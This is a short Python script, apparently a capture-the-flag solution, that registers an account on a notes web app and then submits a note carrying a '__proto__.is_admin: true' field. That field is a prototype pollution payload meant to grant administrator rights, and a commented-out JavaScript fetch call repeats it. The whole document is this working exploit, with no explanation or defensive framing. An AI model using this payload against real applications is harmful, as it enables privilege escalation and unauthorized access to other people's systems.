import requests 

URL = "http://localhost:3004"
URL = "https://notes1.ivan-and-keane-hard.work"
s = requests.session()

s.post(f"{URL}/api/register", {
    "user": "test1",
    "pass": "test1"
})

s.post(f"{URL}/api/create", 
{
    "title": "title",
    "content": "content",
    "__proto__.is_admin": True
})


"""

a = await fetch("https://notes1.ivan-and-keane-hard.work/api/create", {
  "body": "{\"title\":\"dd\",\"content\":\"dd\", \"__proto__.is_admin\": true}",
  "method": "POST"
});


"""